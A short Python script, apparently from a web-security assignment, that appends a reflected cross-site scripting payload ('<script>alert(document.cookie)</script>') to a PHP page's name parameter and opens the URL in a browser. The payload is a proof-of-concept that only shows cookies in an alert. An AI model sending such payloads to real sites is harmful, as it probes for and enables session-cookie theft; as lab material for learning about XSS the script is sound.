import webbrowser

base_url = "http://iu.ru/Assignment/case02.php"
# print("Enter url for case02.php")
url = base_url + "?name=<script>alert(document.cookie)</script>"

webbrowser.open(url, new=2)
